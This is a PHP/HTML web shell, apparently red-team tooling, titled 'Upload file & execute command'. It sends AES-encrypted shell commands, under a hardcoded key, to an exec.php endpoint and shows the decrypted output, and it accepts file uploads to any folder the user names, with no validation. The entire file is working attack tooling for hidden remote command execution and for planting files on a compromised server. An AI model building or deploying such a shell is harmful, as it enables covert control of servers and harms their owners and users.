<!DOCTYPE html>
<html>

<head>
  <title>Upload file & execute command</title>
</head>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script>
  var key = "1234567890123456";
  key = CryptoJS.enc.Utf8.parse(key);

  function encrypt(text, key) {
    var encrypted = CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(text), key, {
      mode: CryptoJS.mode.ECB,
      padding: CryptoJS.pad.Pkcs7
    });
    encrypted = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
    return encrypted;
  }

  function decrypt(encrypted, key) {
    var decrypted = CryptoJS.AES.decrypt({
      ciphertext: CryptoJS.enc.Base64.parse(encrypted)
    }, key, {
      mode: CryptoJS.mode.ECB,
      padding: CryptoJS.pad.Pkcs7
    });
    return decrypted.toString(CryptoJS.enc.Utf8);
  }

  function cmd_exec() {
    var data = document.getElementById("cmd").value;
    data = encrypt(data, key);
    data = encodeURIComponent(data);
    data = "cmd=" + data;
    console.log(data);
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        var res = this.responseText;
        console.log("res:" + res);
        document.getElementById('res').innerHTML = decrypt(res, key);
      }
    };
    xhttp.open("POST", "/redteam03/exec.php", true);
    xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhttp.send(data);
  }
  //multipart/form-data
  // var text = 'US0en';
  // // var key = '1234567890123456'; 

  // console.log('text:', text);
  // console.log('key:', key);
  // console.log('key length:', key.length );

  // // Fix: Use the Utf8 encoder
  // text = CryptoJS.enc.Utf8.parse(text); 
  // Fix: Use the Utf8 encoder (or apply in combination with the hex encoder a 32 hex digit key for AES-128)
  // key = CryptoJS.enc.Utf8.parse(key); 

  // // Fix: Apply padding (e.g. Zero padding). Note that PKCS#7 padding is more reliable and that ECB is insecure
  // var encrypted = CryptoJS.AES.encrypt(text, key, { mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7}); 
  // encrypted = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
  // console.log('encrypted', encrypted);
  // encrypted="9GYClIkiE/OWh7O2dPQZcQ==";
  // // Fix: Pass a CipherParams object (or the Base64 encoded ciphertext)
  // var decrypted =  CryptoJS.AES.decrypt({ciphertext: CryptoJS.enc.Base64.parse(encrypted)}, key, {mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 }); 

  // // Fix: Utf8 decode the decrypted data
  // console.log('decrypted', decrypted.toString(CryptoJS.enc.Utf8)); 
  // console.log(decrypt(encrypted,key));
  // console.log(decrypt("rN83QsyyCPOgUHu75nBgCw==",key));
</script>

<body>
  <div align="left">
    <form action="" method="post" enctype="multipart/form-data">
      <br>
      <b>Folder to save : </b>
      <input type="text" id="target_folder" name="target_folder" style="border: solid;" size="33"><br><br>
      <b>Select file : </b>
      <input type="file" name="file" id="file" style="border: solid;">
      <input type="submit" value="Submit" name="submit"><br><br><br><br>
    </form>
    <b>Command exec: </b> <br>
    <input type="text" id="cmd" name="cmd" style="border: solid;" size="33">
    <button onclick="cmd_exec()">Submit</button><br>
    <a id="res"></a>
  </div>
  <?php
  if (isset($_POST["submit"])) {
    $target_dir = "uploads/";
    $target_file = $_POST["target_folder"] . basename($_FILES["file"]["name"]);
    $type = $_FILES["file"]["type"];

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
      echo "File uploaded " . $target_file;
    } else {
      echo "Upload file failed!";
    }
  }

  ?>
</body>

</html>
